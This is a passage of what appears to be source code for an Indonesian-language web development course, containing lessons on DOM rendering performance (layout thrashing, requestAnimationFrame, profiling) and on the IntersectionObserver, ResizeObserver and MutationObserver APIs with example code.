            'Nama resmi dari apa yang terjadi pada layout thrashing: browser **dipaksa** menghitung tata letak saat itu juga, di luar jadwalnya sendiri. Pemicunya adalah property seperti `offsetWidth`, `offsetHeight`, `getBoundingClientRect()`, dan `getComputedStyle()`.',
        },
        {
          term: 'batching',
          meaning:
            'Terjemahannya **menggabungkan jadi satu rombongan**. Obat untuk layout thrashing: **baca semua dulu, baru tulis semua**. Dengan memisahkan kedua fase, browser hanya perlu menghitung ulang satu kali alih-alih sekali untuk tiap elemen.',
        },
        {
          term: 'requestAnimationFrame',
          meaning:
            'Fungsi untuk menjadwalkan pekerjaan **tepat sebelum browser menggambar frame berikutnya**. Dipakai untuk animasi dan pembaruan visual, karena ia otomatis selaras dengan laju gambar layar — dan berhenti sendiri saat tab tidak terlihat, sehingga hemat baterai.',
        },
        {
          term: '60 fps',
          meaning:
            'Singkatan *frames per second*, artinya **60 gambar per detik** — laju yang membuat gerakan terasa mulus. Konsekuensi angkanya: setiap frame hanya punya jatah sekitar **16,7 milidetik**. Pekerjaan yang melewati batas itu membuat frame terlewat, dan mata langsung menangkapnya sebagai tersendat.',
        },
        {
          term: 'GPU',
          meaning:
            'Singkatan *Graphics Processing Unit*, prosesor khusus untuk urusan gambar. Langkah composite bisa dilimpahkan ke sini, dan itulah alasan teknis kenapa menganimasikan `transform` jauh lebih mulus daripada menganimasikan `width` atau `left`.',
        },
        {
          term: 'profiling',
          meaning:
            'Terjemahannya **pengukuran mendalam**. Memakai tab Performance di DevTools untuk melihat **ke mana waktu benar-benar pergi**, bukan menebak. Prinsipnya sama dengan Sub-bab 3.12: ukur dulu, baru optimalkan.',
        },
      ),

      h2('Tiga langkah render'),
      table(
        ['Langkah', 'Artinya', 'Biaya'],
        [
          ['**Layout / reflow**', 'Menghitung ulang posisi dan ukuran', 'Paling mahal'],
          ['**Paint**', 'Menggambar piksel', 'Sedang'],
          ['**Composite**', 'Menyusun lapisan', 'Murah — bisa di GPU'],
        ],
      ),
      code(
        'js',
        `
        el.style.width = '200px';       // reflow + paint + composite
        el.style.color = 'red';         // paint + composite
        el.style.transform = 'translateX(10px)';   // composite saja
        el.style.opacity = '0.5';                  // composite saja
        `,
      ),
      p(
        'Empat baris ini terlihat setara, karena semuanya sekadar menugaskan satu nilai, tapi biayanya berbeda berlipat-lipat dan komentarnya menyebut kenapa. Mengubah `width` mengubah **ukuran** elemen, sehingga browser harus menghitung ulang posisi elemen lain di sekitarnya (*reflow*), menggambar ulang piksel (*paint*), lalu menyusun lapisannya (*composite*), yaitu tiga tahap penuh. Mengubah `color` tidak menggeser apa pun, jadi tahap reflow dilewati. Sedangkan `transform` dan `opacity` **tidak mengubah apa pun tentang tata letak maupun piksel elemen itu sendiri**, karena keduanya hanya mengubah cara lapisan yang sudah jadi ditempatkan dan dicampur di layar, dan pekerjaan itu bisa diserahkan ke GPU. Urutan biayanya inilah yang menjelaskan seluruh anjuran performa animasi di web.',
      ),
      callout(
        'tip',
        'Kenapa animasi selalu memakai `transform` dan `opacity`',
        'Keduanya hanya memicu tahap composite, yang berjalan di GPU dan tidak menyentuh layout. Menganimasikan `width`, `top`, atau `margin` memicu reflow **setiap frame** — itulah beda animasi mulus dan animasi tersendat.',
      ),

      h2('Layout thrashing'),
      code(
        'js',
        `
        // LAMBAT: membaca dan menulis bergantian
        for (const el of elemen) {
          el.style.height = el.offsetHeight + 10 + 'px';
        }
        // offsetHeight memaksa browser MENYELESAIKAN layout yang tertunda.
        // Karena ada penulisan sebelumnya, layout dihitung ulang tiap iterasi.
        `,
      ),
      p(
        'Satu baris di dalam loop itu sebenarnya melakukan **dua** hal yang saling merusak. `el.offsetHeight` adalah pembacaan, dan menugaskan `el.style.height` adalah penulisan. Normalnya browser menunda perhitungan layout sampai benar-benar dibutuhkan, supaya banyak penulisan bisa digabung jadi satu perhitungan. Tapi pembacaan seperti `offsetHeight` **menuntut jawaban yang akurat saat itu juga**, sehingga browser terpaksa menyelesaikan semua penulisan yang tertunda lebih dulu. Karena keduanya bergantian di dalam loop, siklus itu terulang setiap iterasi: tulis, paksa hitung, tulis, paksa hitung. Untuk seratus elemen berarti seratus perhitungan layout penuh, padahal satu saja sebenarnya cukup — dan pola inilah yang disebut *layout thrashing*.',
      ),
      code(
        'js',
        `
        // CEPAT: baca semua dulu, baru tulis semua
        const tinggi = elemen.map((el) => el.offsetHeight);   // fase baca
        elemen.forEach((el, i) => {
          el.style.height = tinggi[i] + 10 + 'px';            // fase tulis
        });
        `,
      ),
      p(
        'Property yang memicu layout paksa: `offsetTop/Left/Width/Height`, `clientWidth/Height`, `scrollTop/Height`, `getBoundingClientRect()`, dan `getComputedStyle()`.',
      ),

      h2('`requestAnimationFrame`'),
      code(
        'js',
        `
        // SALAH: menyentuh DOM setiap kali event scroll terpicu (bisa ratusan kali/detik)
        window.addEventListener('scroll', () => {
          bar.style.width = hitungPersen() + '%';
        });

        // BENAR: paling banyak sekali per frame
        let terjadwal = false;

        window.addEventListener('scroll', () => {
          if (terjadwal) return;
          terjadwal = true;

          requestAnimationFrame(() => {
            bar.style.width = hitungPersen() + '%';
            terjadwal = false;
          });
        }, { passive: true });
        `,
      ),
      p(
        'Pola `terjadwal` di atas membatasi pekerjaan ke maksimal satu kali per frame, sebab begitu event `scroll` pertama terjadi, `terjadwal` diset `true` dan sebuah `requestAnimationFrame` dijadwalkan, sehingga event `scroll` berikutnya yang datang sebelum frame itu digambar hanya akan `return` lebih awal karena `terjadwal` masih `true`, tidak menjadwalkan panggilan baru. Begitu `requestAnimationFrame` akhirnya berjalan, `terjadwal` dikembalikan ke `false`, siap menerima jadwal berikutnya. Efeknya, ratusan event scroll per detik hanya menghasilkan sebanyak-banyaknya satu pembaruan DOM per frame, bukan ratusan.',
      ),

      h2('Ukur, jangan menebak'),
      ol(
        'Buka **Performance** di DevTools, rekam interaksi yang terasa lambat.',
        'Cari blok kuning (**Scripting**) dan ungu (**Rendering**) yang panjang.',
        'Segitiga merah di sudut task menandakan **long task** — apa pun di atas 50 ms memblokir interaksi.',
        'Klik untuk melihat fungsi mana penyebabnya. Perbaiki yang itu, bukan yang kamu duga.',
      ),
      callout(
        'warning',
        'Optimasi tanpa pengukuran hampir selalu salah sasaran',
        'Kode yang "terlihat lambat" sering bukan penyebabnya. `code-style.md` menyebut ini terang-terangan: jangan mengorbankan kejelasan demi optimasi mikro tanpa bukti pengukuran.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Panel admin punya tabel dua ribu baris dengan tombol Samakan Lebar Kolom. Saat ditekan, tab membeku selama beberapa detik, kipas laptop menyala, dan Chrome sempat menawarkan menutup halaman. Kodenya sederhana, yaitu telusuri seluruh baris, baca lebarnya, lalu setel lebar barunya. Tidak ada jaringan, tidak ada perhitungan berat, dan hanya dua ribu elemen.',
      ),
      p(
        'Angka di bawah diukur sungguhan di Chromium pada dua ribu elemen, dan selisihnya jauh lebih besar daripada yang biasanya diduga.',
      ),
      compare(
        {
          title: 'Baca dan tulis selang-seling',
          lang: 'js',
          code: `
          for (const el of anak) {
            const w = el.offsetWidth;        // BACA -> paksa hitung tata letak
            el.style.width = (w + 1) + 'px'; // TULIS -> batalkan hasil perhitungan
          }

          // Terukur: 2147 ms
          `,
          notes: ['Dua ribu kali hitung ulang tata letak, satu per elemen'],
        },
        {
          title: 'Baca semua dulu, lalu tulis semua',
          lang: 'js',
          code: `
          const lebar = [];
          for (const el of anak) lebar.push(el.offsetWidth);   // BACA semua

          for (let i = 0; i < anak.length; i++) {              // TULIS semua
            anak[i].style.width = (lebar[i] + 1) + 'px';
          }

          // Terukur: 4 ms
          `,
          notes: ['Satu kali hitung tata letak untuk seluruh pembacaan'],
        },
      ),
      p(
        'Selisih 2147 melawan 4 milidetik itu lebih dari lima ratus kali lipat, dan kedua kolom menghasilkan tampilan yang sama persis. Yang berbeda hanya urutan operasinya. Ini pola yang disebut layout thrashing, dan ia salah satu penyebab pembekuan halaman yang paling sering sekaligus paling mudah diperbaiki.',
      ),
      p(
        'Mekanismenya bisa dijelaskan langkah demi langkah. Peramban menunda perhitungan tata letak sampai benar-benar dibutuhkan, sehingga menulis gaya berkali-kali hanya memicu satu perhitungan di akhir. Tapi membaca properti seperti `offsetWidth` **membutuhkan** hasil perhitungan itu sekarang juga, sehingga peramban terpaksa menghitung. Kalau kamu menulis lalu membaca lalu menulis lagi, tiap pembacaan memaksa perhitungan ulang atas tulisan sebelumnya.',
      ),
      code(
        'text',
        `
        Properti yang MEMAKSA perhitungan tata letak saat dibaca:

        offsetTop  offsetLeft  offsetWidth  offsetHeight  offsetParent
        clientTop  clientLeft  clientWidth  clientHeight
        scrollTop  scrollLeft  scrollWidth  scrollHeight
        getBoundingClientRect()   getComputedStyle()   focus()
        `,
        { caption: 'Membaca salah satu dari ini setelah menulis gaya memicu perhitungan ulang.' },
      ),
      p(
        'Daftar ini layak dikenali, bukan dihafal. Cirinya satu, yaitu semuanya menjawab pertanyaan tentang **posisi atau ukuran nyata** sebuah elemen di layar. Peramban tidak bisa menjawabnya tanpa menghitung tata letak lebih dulu. Perhatikan `getComputedStyle` juga termasuk, dan itu sering mengejutkan karena namanya terdengar seperti sekadar membaca gaya.',
      ),
      code(
        'js',
        `
        // Pengukuran lain dari mesin yang sama, dua ribu elemen:
        // appendChild satu per satu      -> 1 ms
        // DocumentFragment sekali pasang -> 2 ms

        // Menambah node BUKAN operasi mahal di peramban modern.
        for (let i = 0; i < 2000; i += 1) {
          const d = document.createElement('div');
          d.textContent = i;
          wadah.appendChild(d);          // aman, selama tidak ada pembacaan di antaranya
        }
        `,
        { caption: 'Nasihat lama tentang `DocumentFragment` sudah tidak berlaku untuk kecepatan.' },
      ),
      p(
        'Angka ini penting untuk diketahui karena banyak nasihat lama menyebut penambahan node satu per satu sebagai penyebab kelambatan. Pengukuran di Chromium menunjukkan dua ribu penambahan hanya butuh sekitar satu milidetik, dan versi `DocumentFragment` justru dua milidetik. Peramban modern sudah menunda perhitungan tata letak sampai akhir tugas. Yang benar-benar mahal adalah **membaca**, bukan menulis.',
      ),
      p(
        'Alasan memakai `DocumentFragment` tetap ada, dan alasannya bukan kecepatan. Ia membuat maksudnya lebih jelas, dan ia menghindari keadaan setengah jadi yang sempat terlihat kalau ada kode lain yang kebetulan membaca tata letak di tengah loop. Menyebutnya sebagai pengoptimalan kecepatan sudah tidak jujur untuk peramban hari ini.',
      ),
      callout(
        'tip',
        'Urutan yang menyelesaikan hampir seluruh masalah tata letak',
        'Kelompokkan pekerjaanmu menjadi dua tahap. Tahap pertama membaca seluruh yang perlu dibaca dan menyimpannya ke array. Tahap kedua menulis semuanya. Selama tidak ada satu pun pembacaan di antara penulisan, peramban hanya menghitung tata letak sekali. Untuk kasus yang lebih rumit, `requestAnimationFrame` bisa dipakai untuk memisahkan kedua tahap ke bingkai yang berbeda.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Masalah performa hampir tidak pernah melempar error. Yang muncul adalah peringatan peramban dan gejala yang harus kamu kenali sendiri.',
      ),
      code(
        'text',
        `
        [Violation] 'click' handler took 2153ms
        [Violation] Forced reflow while executing JavaScript took 2140ms
        `,
        { caption: 'Peringatan Chrome yang menyebut jenis dan durasinya.' },
      ),
      p(
        'Baris kedua adalah petunjuk yang paling berharga di seluruh sub-bab ini. Kata `Forced reflow` berarti persis yang dibahas di atas, yaitu ada pembacaan yang memaksa perhitungan tata letak di tengah penulisan. Kalau kamu melihat pesan ini, kamu tidak perlu menebak sama sekali, sebab penyebabnya sudah disebut. Yang perlu dicari adalah pembacaan properti dari daftar di atas yang berada di dalam loop.',
      ),
      code(
        'text',
        `
        (Halaman berhenti merespons selama beberapa detik.)

        Chrome: "Halaman ini tidak merespons" — Tunggu / Keluar
        `,
        { caption: 'Utas utama tertahan terlalu lama.' },
      ),
      p(
        'Dialog ini sudah dibahas di Bab 3 untuk perhitungan berat, dan di sini penyebabnya berbeda. Cara membedakan keduanya cepat, yaitu rekam di tab Performance lalu lihat warna baloknya. Perhitungan JavaScript murni muncul sebagai balok kuning bernama fungsimu. Layout thrashing muncul sebagai deretan balok ungu bertuliskan Layout yang berulang ratusan kali, dan pola berulang itu sangat khas.',
      ),
      code(
        'text',
        `
        el.style.width = '100px';
        console.log(el.offsetWidth);     // 100
        el.style.width = '200px';
        console.log(el.offsetWidth);     // 200

        // Benar hasilnya, dan memicu dua kali perhitungan tata letak.
        `,
        { caption: 'Tidak ada error, dan hasilnya benar. Biayanya yang tersembunyi.' },
      ),
      p(
        'Ini bentuk paling kecil dari masalah yang sama, dan ia tidak terasa sama sekali untuk dua elemen. Yang perlu diwaspadai adalah bentuk ini di dalam fungsi yang dipanggil untuk tiap baris tabel. Fungsi yang terlihat murah karena hanya berisi empat baris menjadi sangat mahal begitu dipanggil dua ribu kali, dan biayanya tidak terlihat dari membaca fungsinya sendiri.',
      ),
      code(
        'text',
        `
        window.addEventListener('scroll', () => {
          const atas = elemen.getBoundingClientRect().top;
          bar.style.transform = \`translateY(\${atas}px)\`;
        });

        // Gulir terasa tersendat, terutama di ponsel.
        `,
        { caption: 'Pembacaan tata letak di dalam penangan gulir.' },
      ),
      p(
        'Peristiwa gulir dipicu sangat sering, bisa puluhan kali per detik, dan tiap pemanggilan di sini memaksa perhitungan tata letak. Ada dua perbaikan yang berpasangan. Pertama, tambahkan opsi `{ passive: true }` supaya peramban tidak perlu menunggu penanganmu sebelum menggulir. Kedua, pindahkan penulisannya ke dalam `requestAnimationFrame` supaya ia terjadi sekali per bingkai, bukan sekali per peristiwa gulir.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`[Violation] Forced reflow ... took ...ms`',
            'Pembacaan tata letak di tengah penulisan',
            'Pisahkan menjadi tahap baca semua lalu tulis semua',
          ],
          [
            '"Halaman ini tidak merespons"',
            'Utas utama tertahan, bisa perhitungan berat atau layout thrashing',
            'Rekam di tab Performance, lalu cari balok Layout yang berulang',
          ],
          [
            'Gulir terasa tersendat di ponsel',
            'Penangan gulir membaca tata letak tiap pemanggilan',
            'Tambahkan `{ passive: true }` dan bungkus penulisan dengan `requestAnimationFrame`',
          ],
          [
            'Fungsi kecil menjadi sangat lambat saat dipanggil banyak kali',
            'Ada pembacaan tata letak di dalamnya',
            'Angkat pembacaannya keluar dari loop',
          ],
          [
            'Halaman berkedip saat daftar diperbarui',
            'Elemen dibongkar dan dibangun ulang seluruhnya',
            'Perbarui hanya yang berubah, jangan menulis ulang seluruh wadah',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Performa DOM penuh dengan nasihat lama yang sudah tidak berlaku, dan sebagian baris di bawah adalah tentang melepaskan nasihat itu.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Membaca `offsetWidth` di dalam loop yang juga menulis gaya',
            'Tiap elemen kan perlu diukur sendiri',
            'Tiap pembacaan memaksa perhitungan ulang tata letak. Terukur 2147 milidetik untuk dua ribu elemen, melawan 4 milidetik kalau dipisah',
          ],
          [
            'Memakai `DocumentFragment` sebagai pengoptimalan kecepatan',
            'Nasihatnya beredar luas',
            'Untuk peramban modern selisihnya tidak berarti, bahkan bisa sedikit lebih lambat. Pakai untuk kejelasan maksud, bukan untuk kecepatan',
          ],
          [
            'Mengoptimalkan sebelum mengukur',
            'Lebih cepat pasti lebih baik',
            'Sebagian besar tebakan tentang bagian mana yang lambat ternyata salah. Rekam di tab Performance lebih dulu, lalu perbaiki yang memang muncul di sana',
          ],
          [
            'Memasang penangan gulir tanpa `passive`',
            'Penangannya kan ringan',
            'Peramban tidak tahu apakah kamu akan memanggil `preventDefault`, jadi ia menunggu penanganmu sebelum menggulir. Guliran terasa tersendat walau penanganmu cepat',
          ],
          [
            'Menganimasikan `width`, `height`, `top`, atau `left`',
            'Itu properti yang mengatur posisi',
            'Keempatnya memicu perhitungan tata letak tiap bingkai. Pakai `transform` dan `opacity` yang bisa ditangani utas komposisi tanpa menghitung ulang',
          ],
          [
            'Memakai `innerHTML` untuk memperbarui satu angka di dalam daftar besar',
            'Satu baris dan langsung jadi',
            'Seluruh isi wadah dibongkar dan dibangun ulang. Ubah `textContent` elemen yang bersangkutan saja',
          ],
        ],
      ),
      p(
        'Baris kelima punya alasan yang layak dipahami, bukan dihafal. Properti `transform` dan `opacity` bisa diterapkan tanpa mengubah posisi elemen lain, sehingga peramban bisa menyerahkannya ke utas komposisi yang berjalan terpisah dari utas utama. Itulah kenapa animasi berbasis `transform` tetap mulus bahkan saat JavaScript sedang sibuk, sementara animasi berbasis `left` ikut tersendat.',
      ),
      callout(
        'warning',
        'Ukur di perangkat yang mirip milik pengguna, bukan di mesin pengembangan',
        'Angka 2147 milidetik di atas diukur pada mesin pengembangan yang cepat. Di ponsel kelas menengah yang biasanya tiga sampai lima kali lebih lambat, angka yang sama menjadi enam sampai sepuluh detik. Tab Performance menyediakan pembatas CPU, dan memakainya membuat masalah performa terlihat sebelum pengguna menemukannya.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Reflow (layout) paling mahal; `transform` dan `opacity` hanya memicu composite.',
        'Membaca property layout memaksa perhitungan — jangan diselang-seling dengan penulisan.',
        'Kumpulkan semua pembacaan dulu, baru semua penulisan.',
        '`requestAnimationFrame` membatasi pembaruan ke satu kali per frame.',
        'Ukur dengan Performance panel sebelum mengubah apa pun.',
      ),
      references(
        {
          label: 'Avoid large, complex layouts and layout thrashing',
          href: 'https://web.dev/articles/avoid-large-complex-layouts-and-layout-thrashing',
          source: 'web.dev',
          note: 'Rujukan utama sub-bab ini, lengkap dengan daftar property yang memicu layout paksa.',
        },
        {
          label: 'Stick to compositor-only properties',
          href: 'https://web.dev/articles/stick-to-compositor-only-properties-and-manage-layer-count',
          source: 'web.dev',
          note: 'Alasan `transform` dan `opacity` jauh lebih murah daripada `width` atau `left`.',
        },
        {
          label: 'Window.requestAnimationFrame()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/requestAnimationFrame',
          source: 'MDN',
          note: 'Termasuk perilaku berhenti sendiri saat tab tidak terlihat.',
        },
        {
          label: 'Analyze runtime performance',
          href: 'https://developer.chrome.com/docs/devtools/performance',
          source: 'Chrome DevTools',
          note: 'Panduan resmi membaca panel Performance — langkah "ukur, jangan menebak" di atas.',
        },
        {
          label: 'Interaction to Next Paint (INP)',
          href: 'https://web.dev/articles/inp',
          source: 'web.dev',
          note: 'Ambang resmi yang menjelaskan kenapa task di atas 50 ms terasa mengganggu.',
        },
      ),
    ],
  ),

  written(
    'observer-api',
    'Observer API',
    22,
    'Bereaksi terhadap perubahan tanpa polling dan tanpa listener scroll.',
    [
      p(
        'Tiga API bawaan yang memberi tahu saat sesuatu berubah — jauh lebih murah daripada memeriksa terus-menerus.',
      ),

      terms(
        {
          term: 'observer',
          meaning:
            'Terjemahannya **pengamat**. Objek yang kamu daftarkan sekali, lalu **browser yang memberi tahu** ketika sesuatu berubah. Kebalikan dari cara lama yang harus terus-menerus memeriksa sendiri — dan justru "diberi tahu" versus "memeriksa" inilah yang membuatnya jauh lebih murah.',
        },
        {
          term: 'polling',
          meaning:
            'Terjemahannya **memeriksa berulang-ulang**. Cara lama mengetahui perubahan: menjalankan pemeriksaan tiap sekian milidetik, entah ada perubahan atau tidak. Boros karena sebagian besar pemeriksaannya sia-sia, dan tetap saja terlambat mengetahui perubahan yang terjadi di sela-selanya.',
        },
        {
          term: 'IntersectionObserver',
          meaning:
            'Dari *intersection* (perpotongan). Pengamat yang memberi tahu ketika sebuah elemen **masuk atau keluar area layar**. Menggantikan pendengar `scroll` yang berjalan puluhan kali per detik. Pemakaian sehari-harinya: memuat gambar saat mendekati layar, infinite scroll, dan penanda bagian aktif pada daftar isi.',
        },
        {
          term: 'ResizeObserver',
          meaning:
            'Pengamat yang memberi tahu ketika **ukuran sebuah elemen** berubah — bukan hanya ukuran jendela. Ini pembedaan pentingnya: sebuah panel bisa berubah lebar karena sidebar dibuka, tanpa jendela browser berubah sama sekali, dan `window.resize` tidak akan tahu apa-apa.',
        },
        {
          term: 'MutationObserver',
          meaning:
            'Pengamat yang memberi tahu ketika **isi DOM berubah** — elemen ditambah, dihapus, atau atributnya diubah. Paling jarang dibutuhkan dari ketiganya, karena biasanya kamu sendiri yang mengubah DOM sehingga sudah tahu. Berguna saat perubahannya datang dari kode pihak ketiga.',
        },
        {
          term: 'entry',
          meaning:
            'Satu laporan perubahan yang diterima callback pengamat. Perhatikan bahwa callback selalu menerima **array** — beberapa perubahan bisa dilaporkan sekaligus dalam satu panggilan, sehingga kamu hampir selalu perlu me-loop isinya.',
        },
        {
          term: 'isIntersecting',
          meaning:
            'Property boolean pada entry yang menjawab apakah elemennya **sedang bersinggungan** dengan area pengamatan. Wajib diperiksa lebih dulu, karena callback juga dipanggil saat elemen **keluar** layar — bukan hanya saat masuk.',
        },
        {
          term: 'rootMargin',
          meaning:
            'Opsi yang **melebarkan atau menyempitkan** area pengamatan. Menulis `"200px"` membuat elemen dianggap masuk **200 piksel sebelum benar-benar terlihat** — sehingga gambar sudah selesai dimuat tepat ketika pengguna sampai ke sana.',
        },
        {
          term: 'threshold',
          meaning:
            'Terjemahannya **ambang**. Seberapa banyak bagian elemen yang harus terlihat sebelum callback dipanggil. `0` berarti sedikit saja sudah cukup, `1` berarti harus terlihat seluruhnya, `0.5` berarti setengahnya.',
        },
        {
          term: 'unobserve / disconnect',
          meaning:
            '`unobserve(el)` berhenti mengamati **satu** elemen, sedangkan `disconnect()` menghentikan **seluruh** pengamatan sekaligus. Wajib dipanggil kalau pengamatannya memang cuma sekali, seperti memuat gambar, agar tidak ada pekerjaan sia-sia dan memori yang tertahan.',
        },
      ),

      h2('`IntersectionObserver` — saat elemen masuk layar'),
      code(
        'js',
        `
        const pengamat = new IntersectionObserver(
          (entries) => {
            for (const entry of entries) {
              if (!entry.isIntersecting) continue;

              const img = entry.target;
              img.src = img.dataset.src;      // baru muat sekarang
              pengamat.unobserve(img);        // sekali saja
            }
          },
          {
            rootMargin: '200px',   // mulai memuat 200px SEBELUM terlihat
            threshold: 0,
          },
        );

        document.querySelectorAll('img[data-src]').forEach((img) => pengamat.observe(img));
        `,
      ),
      p(
        'Pola pemakaiannya selalu tiga langkah, dan contoh ini memakai ketiganya. Pertama, **buat pengamat** dengan fungsi yang akan dipanggil browser. Kedua, **daftarkan** elemen yang mau diamati lewat `observe`, dan baris terakhir mendaftarkan semua gambar sekaligus. Ketiga, **hentikan** pengamatan saat tidak dibutuhkan lagi. Perhatikan gambarnya disimpan di `data-src`, bukan `src`, sehingga browser tidak mengunduhnya sampai baris `img.src = img.dataset.src` dijalankan. Di situlah penghematannya. Pemanggilan `unobserve` tepat sesudahnya juga penting, karena tanpa itu pengamat terus melapor tiap kali gambar keluar-masuk layar padahal pekerjaannya sudah selesai. Dua opsi di bawah mengatur kapan "terlihat" dihitung. `rootMargin: \'200px\'` memperluas area pemicu 200 piksel ke luar layar, sehingga gambar mulai dimuat **sebelum** pengguna melihatnya dan terasa sudah siap saat tiba, sedangkan `threshold: 0` berarti cukup satu piksel bersinggungan.',
      ),
      callout(
        'tip',
        'Pemakaian lain yang sering',
        'Infinite scroll (amati elemen sentinel di bawah daftar), penanda bagian aktif pada daftar isi, dan menghentikan video saat keluar layar. Website ini memakainya untuk menandai bagian aktif di daftar isi halaman materi.',
      ),

      h2('`ResizeObserver` — saat ukuran elemen berubah'),
      code(
        'js',
        `
        const pengamatUkuran = new ResizeObserver((entries) => {
          for (const entry of entries) {
            const { width } = entry.contentRect;
            entry.target.classList.toggle('sempit', width < 400);
          }
        });

        pengamatUkuran.observe(kartu);
        `,
      ),
      p(
        'Bedanya dengan `window.resize`: ia memantau **elemennya**, bukan jendela. Elemen bisa berubah ukuran karena sidebar terbuka, font termuat, atau isinya bertambah — tanpa jendela berubah sama sekali.',
      ),

      h2('`MutationObserver` — saat DOM berubah'),
      code(
        'js',
        `
        const pengamatDom = new MutationObserver((mutasi) => {
          for (const m of mutasi) {
            if (m.type === 'childList') console.log('anak berubah', m.addedNodes);
            if (m.type === 'attributes') console.log('atribut', m.attributeName);
          }
        });

        pengamatDom.observe(wadah, {
          childList: true,
          attributes: true,
          subtree: true,
        });
        `,
      ),
      p(
        'Objek opsi di baris terakhir adalah bagian yang menentukan, karena `MutationObserver` **tidak mengamati apa pun sampai kamu menyebutkan jenisnya**. `childList: true` melaporkan penambahan dan penghapusan anak, `attributes: true` melaporkan perubahan atribut, dan `subtree: true` memperluas keduanya ke seluruh keturunan, bukan hanya anak langsung. Menghilangkan `subtree` adalah penyebab paling umum "observernya tidak jalan", sebab perubahannya terjadi dua tingkat di dalam dan tidak pernah dilaporkan. Fungsi callback-nya menerima **array** mutasi, bukan satu, karena beberapa perubahan yang terjadi berdekatan dikumpulkan lalu dilaporkan sekaligus, dan itu sebabnya isinya diproses dengan loop dan tiap entri perlu diperiksa `m.type`-nya lebih dulu. Peringatan di bawah tetap berlaku, sebab alat ini untuk mengamati DOM yang diubah kode di luar kendalimu.',
      ),
      callout(
        'warning',
        '`MutationObserver` adalah pilihan terakhir',
        'Kalau kamu yang mengubah DOM-nya, kamu sudah tahu kapan itu terjadi — panggil saja fungsinya langsung. Ia benar-benar diperlukan hanya saat mengamati DOM yang diubah kode di luar kendalimu.',
      ),

      h2('Selalu putuskan pengamatan'),
      code(
        'js',
        `
        pengamat.unobserve(el);   // berhenti mengamati satu elemen
        pengamat.disconnect();    // berhenti sepenuhnya

        // Di React:
        useEffect(() => {
          const o = new IntersectionObserver(cb);
          o.observe(ref.current);
          return () => o.disconnect();     // WAJIB
        }, []);
        `,
      ),
      p(
        'Ketiga jenis pengamat di sub-bab ini punya kewajiban yang sama, dan alasannya sama dengan listener pada `window` di sub-bab event. **Pengamat menahan elemen yang diamatinya tetap hidup di memori**, bahkan setelah elemen itu dihapus dari halaman. Pilih `unobserve` bila hanya satu elemen yang selesai diamati, seperti gambar yang sudah terlanjur dimuat, dan `disconnect` bila seluruh pengamatan memang berakhir. Bagian React di bawah menunjukkan tempat yang benar untuk melakukannya. Fungsi yang dikembalikan `useEffect` dijalankan saat komponen dilepas, dan itulah satu-satunya kesempatan membersihkan. Tanpa baris itu, berpindah halaman sepuluh kali di aplikasi satu halaman meninggalkan sepuluh pengamat yang masih berjalan. Masing-masing masih memanggil callback-nya, masih menahan elemen lama, dan tidak ada satu pun error yang memberitahumu.',
      ),

      h2('Kenapa ini mengalahkan listener `scroll`'),
      table(
        ['', 'Listener `scroll`', '`IntersectionObserver`'],
        [
          ['Frekuensi', 'Ratusan kali per detik', 'Hanya saat melintasi ambang'],
          ['Butuh baca layout', 'Ya (`getBoundingClientRect`)', 'Tidak'],
          ['Berjalan di main thread', 'Ya', 'Sebagian di luar'],
          ['Kode', 'Manual, perlu throttle', 'Deklaratif'],
        ],
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman katalog memuat produk secara bertahap saat pengguna menggulir ke bawah. Kamu memasang penangan gulir yang menghitung apakah elemen penanda sudah terlihat, dan hasilnya guliran terasa tersendat di ponsel serta permintaan kadang berangkat dua kali karena penanganya terpanggil puluhan kali per detik. Selain itu, gambar produk yang belum terlihat tetap ikut diunduh sejak awal sehingga halaman berat.',
      ),
      p(
        'Kedua masalah punya satu jawaban yang sama, yaitu `IntersectionObserver`. Ia memberi tahu kapan sebuah elemen masuk atau keluar dari pandangan, tanpa satu pun pembacaan tata letak dari kodemu.',
      ),
      code(
        'js',
        `
        const penanda = document.getElementById('penanda-muat-lagi');
        let sedangMuat = false;

        const pengamat = new IntersectionObserver(
          async (entri) => {
            const terlihat = entri.some((e) => e.isIntersecting);
            if (!terlihat || sedangMuat) return;

            sedangMuat = true;
            try {
              const adaLagi = await muatHalamanBerikut();
              if (!adaLagi) pengamat.disconnect();     // berhenti mengamati, selesai
            } finally {
              sedangMuat = false;
            }
          },
          {
            // Mulai memuat 400px SEBELUM penandanya benar-benar terlihat.
            rootMargin: '0px 0px 400px 0px',
            threshold: 0,
          },
        );

        pengamat.observe(penanda);
        `,
        { filename: 'src/katalog/muat-bertahap.js' },
      ),
      p(
        'Perbedaan mendasar dari penangan gulir adalah siapa yang bekerja. Peramban sudah tahu posisi setiap elemen sebagai bagian dari pekerjaannya sendiri, sehingga memberi tahu kamu saat sesuatu masuk pandangan hampir tidak menambah biaya. Sebaliknya penangan gulir memaksa **kodemu** menghitung posisi puluhan kali per detik, dan tiap perhitungan itu memicu pembacaan tata letak seperti dibahas di Sub-bab 4.11.',
      ),
      p(
        'Opsi `rootMargin` adalah bagian yang membuat pengalaman terasa mulus, dan ia sering dilewatkan. Dengan nilai 400 piksel di bawah, pemuatan dimulai saat penandanya masih empat ratus piksel di luar layar, sehingga data biasanya sudah tiba saat pengguna sampai ke sana. Tanpa itu, pengguna selalu melihat jeda kosong di ujung daftar.',
      ),
      p(
        'Penjaga `sedangMuat` tetap diperlukan meskipun sudah memakai pengamat. Penyebabnya, satu peristiwa perpotongan bisa dipicu lagi sebelum permintaan pertama selesai, misalnya saat pengguna menggulir naik lalu turun lagi. Pola bendera sedang berjalan ini sama dengan yang dipakai untuk mencegah pengiriman formulir ganda di Sub-bab 4.7.',
      ),
      code(
        'js',
        `
        // MutationObserver: bereaksi terhadap perubahan DOM yang bukan kamu yang buat.
        const pengamatDom = new MutationObserver((rekaman) => {
          console.log(rekaman.length, rekaman[0].type);
          // Terukur di Chromium: 2 childList
          // DUA perubahan digabung menjadi SATU pemanggilan.
        });

        pengamatDom.observe(wadah, { childList: true });

        wadah.appendChild(document.createElement('span'));
        wadah.appendChild(document.createElement('span'));
        `,
